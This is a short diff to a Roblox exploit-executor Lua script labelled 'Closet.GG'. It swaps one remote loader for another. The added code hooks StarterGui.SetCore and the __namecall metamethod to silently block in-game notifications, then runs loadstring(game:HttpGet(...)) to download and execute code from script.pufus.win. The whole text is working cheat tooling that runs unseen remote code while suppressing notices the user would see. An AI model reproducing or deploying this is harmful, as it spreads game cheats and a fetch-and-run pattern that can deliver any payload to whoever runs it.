@@ -5,4 +5,26 @@
     Closet.GG > Premium/Skidded slops
 ]] 
 
-loadstring(game:HttpGet("https://flowauth.net/v1/loaders/Closet_GG_Loader.lua"))()
+local StarterGui = game:GetService("StarterGui")
+
+local old_setcore = clonefunction(StarterGui.SetCore)
+
+hookfunction(StarterGui.SetCore, newcclosure(function(self, name, ...)
+	if name == "SendNotification" then
+		print("[hook] blocked SendNotification")
+		return
+	end
+	return old_setcore(self, name, ...)
+end))
+
+local old_namecall
+old_namecall = hookmetamethod(game, "__namecall", function(self, ...)
+	if getnamecallmethod() == "SetCore" and self == StarterGui and (...) == "SendNotification" then
+		print("[hook] blocked SendNotification (namecall)")
+		return
+	end
+	return old_namecall(self, ...)
+end)
+
+print("[hook] armed")
+loadstring(game:HttpGet("https://script.pufus.win/nnm2k8fv"))()
